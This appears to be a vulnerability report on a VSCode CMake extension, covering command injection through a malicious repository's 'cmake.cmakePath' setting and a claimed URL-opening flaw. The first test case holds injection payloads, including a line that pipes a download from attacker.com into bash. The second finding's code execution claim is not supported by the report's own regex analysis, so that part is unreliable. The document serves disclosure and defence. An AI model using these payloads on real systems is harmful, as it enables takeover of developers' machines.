# Vulnerabilities Analysis

## 1. Command Injection in cmake Child Process Execution

### Vulnerability Name
Command Injection through Unsanitized CMake Path Configuration

### Description
The extension allows users to specify a custom path to the CMake executable via the `cmake.cmakePath` configuration. This path is parsed using the `commandArgs2Array` function and then directly used in `child_process.spawn()`. An attacker can craft a malicious repository with a targeted `.vscode/settings.json` file that includes command injection payloads in the `cmake.cmakePath` setting. When a victim opens this repository in VSCode with the CMake extension installed, the malicious commands will be executed.

Step by step:
1. The attacker creates a malicious repository with a `.vscode/settings.json` file containing a crafted `cmake.cmakePath` value
2. The victim opens this repository in VSCode with the CMake extension enabled
3. The extension reads the `cmakePath` configuration via the `config<T>` function
4. The `commandArgs2Array` function splits the input but doesn't properly sanitize or validate it
5. When any CMake-related functionality is triggered (completion, hover, online help), the malicious command is executed

### Impact
An attacker can achieve remote code execution on the victim's system with the same privileges as the VSCode process. This allows them to access, modify, or exfiltrate sensitive files, install additional malware, or use the victim's machine as a pivot for further attacks.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
None. The extension directly passes the user-provided command to `child_process.spawn()` without proper validation or sanitization.

### Missing Mitigations
1. Command string validation to ensure only legitimate CMake paths are accepted
2. Use of a whitelist of allowed commands/parameters
3. Sanitization of input to prevent shell metacharacters from being interpreted
4. Isolation of the CMake process execution in a restricted environment

### Preconditions
- Victim must have the CMake extension installed in VSCode
- Victim must open a malicious repository in VSCode
- The extension must be triggered to execute a CMake command (auto-triggered by suggestions, hover, etc.)

### Source Code Analysis
The vulnerability starts in the `config` function in `extension.ts`:

```typescript
function config<T>(key: string, defaultValue?: any): T {
    const cmake_conf = workspace.getConfiguration('cmake');
    return cmake_conf.get<T>(key, defaultValue);
}
```

This function retrieves user settings from the workspace configuration, including the potentially malicious `cmake.cmakePath`.

The `cmake` function then uses this value:

```typescript
let cmake = (args: string[]): Promise<string> => {
    return new Promise(function (resolve, reject) {
        let cmake_config = config<string>('cmakePath', 'cmake');
        let cmake_args = commandArgs2Array(cmake_config)
        let cmd = child_process.spawn(cmake_args[0], cmake_args.slice(1, cmake_args.length)
                .concat(args.map(arg => { return arg.replace(/\r/gm, ''); })));
        // ...
    });
}
```

The parsing of the command is done by `commandArgs2Array`:

```typescript
function commandArgs2Array(text: string): string[] {
    const re = /^"[^"]*"$/; // Check if argument is surrounded with double-quotes
    const re2 = /^([^"]|[^"].*?[^"])$/; // Check if argument is NOT surrounded with double-quotes
  
    let arr = [];
    let argPart = null;
  
    text && text.split(" ").forEach(function(arg) {
      if ((re.test(arg) || re2.test(arg)) && !argPart) {
        arr.push(arg);
      } else {
        argPart = argPart ? argPart + " " + arg : arg;
        // If part is complete (ends with a double quote), we can add it to the array
        if (/"$/.test(argPart)) {
          arr.push(argPart);
          argPart = null;
        }
      }
    });
    return arr;
}
```

This function attempts to handle quoted arguments but doesn't properly sanitize input to prevent command injection.

The key issue is that `child_process.spawn` will execute the command specified in `cmake_args[0]`, which can be controlled by an attacker through the workspace settings.

### Security Test Case
1. Create a malicious repository with the following `.vscode/settings.json` file:

```json
{
    "cmake.cmakePath": "cmd.exe /c calc.exe && cmake"
}
```

2. Open this repository in VSCode with the CMake extension installed
3. Wait for the extension to activate (or trigger it by typing CMake commands in a CMakeLists.txt file)
4. Observe that the calculator application launches, demonstrating arbitrary code execution
5. For Linux/Mac targets, a similar payload would be: `"cmake.cmakePath": "/bin/bash -c 'curl -s http://attacker.com/payload | bash' || cmake"`

This test confirms that an attacker can achieve remote code execution through the extension by simply having a victim open a malicious repository.

## 2. Code Execution via Malicious CMake Online Documentation URL

### Vulnerability Name
Code Execution through Unvalidated URL Opening

### Description
The CMake extension includes a feature to open online documentation by constructing a URL based on the installed CMake version and then opening it using the 'opener' package. If an attacker can manipulate the CMake binary response, they could potentially inject a malicious URL scheme like `file://` or even custom protocol handlers that could lead to code execution.

Step by step:
1. An attacker creates a malicious CMake executable or wrapper script
2. The attacker places it in a repository and configures the extension to use this as the CMake path
3. When the victim uses the "CMake: Online Help" command, the extension will query the version using this malicious executable
4. The malicious executable returns a crafted string that causes the resulting URL to trigger code execution when opened

### Impact
This vulnerability could allow remote code execution through the opening of malicious URLs or protocol handlers, potentially leading to the execution of arbitrary code with the same privileges as the VSCode process.

### Vulnerability Rank
High

### Currently Implemented Mitigations
None. The extension constructs URLs based on unchecked output from external processes and passes them directly to the opener library.

### Missing Mitigations
1. Validate the CMake version string against a strict regex before using it to construct URLs
2. Whitelist allowed URL schemes (http, https) and reject others (file, javascript, etc.)
3. Sanitize the constructed URL to prevent protocol handler abuse

### Preconditions
- Victim must have the CMake extension installed in VSCode
- Victim must be tricked into configuring a malicious executable as their CMake path
- Victim must trigger the "CMake: Online Help" command

### Source Code Analysis
When "CMake: Online Help" is triggered, the extension calls `cmake_online_help`:

```typescript
async function cmake_online_help(search: string) {
    let url = await cmake_help_url();
    let v2x = url.endsWith('html'); // cmake < 3.0 
    // ...
    var opener = require("opener");
    // ...
    opener(url); // or constructs other URLs based on search terms
}
```

The URL is constructed by `cmake_help_url`:

```typescript
async function cmake_help_url() {
    let base_url = 'https://cmake.org/cmake/help';
    let version = await cmake_version();
    if (version.length > 0) {
        // Constructs URL path based on version
    }
    // ...
    return base_url + '/v' + version;
}
```

The version comes from executing the CMake binary:

```typescript
async function cmake_version(): Promise<string> {
    let cmd_output = await cmake(['--version']);
    let version = _extractVersion(cmd_output);
    return version;
}

function _extractVersion(output: string): string {
    let re = /cmake\s+version\s+(\d+.\d+.\d+)/;
    if (re.test(output)) {
        let result = re.exec(output);
        return result[1];
    }
    return '';
}
```

If an attacker can control the CMake executable, they could make it return a string that passes the regex check but contains malicious content that affects the final URL construction, potentially resulting in a malicious URL being opened.

### Security Test Case
1. Create a malicious CMake executable or wrapper script (e.g., `fakecmake.bat` for Windows or `fakecmake.sh` for Linux)
2. For Windows:
```batch
@echo off
echo cmake version 3.0.0
echo file://C:/Windows/System32/calc.exe
```
3. For Linux/Mac:
```bash
#!/bin/bash
echo "cmake version 3.0.0"
echo "file:///etc/passwd"
```
4. Make the script executable and place it in a test repository
5. Configure `.vscode/settings.json` to use this script:
```json
{
    "cmake.cmakePath": "./fakecmake.bat" 
}
```
6. Open the repository in VSCode with the CMake extension installed
7. Run the "CMake: Online Help" command
8. Observe that instead of opening legitimate documentation, it attempts to open the file:// URL

This test demonstrates that an attacker who can control the CMake executable path can potentially cause arbitrary URL schemes to be opened, which could lead to code execution if exploitable protocol handlers are registered on the victim's system.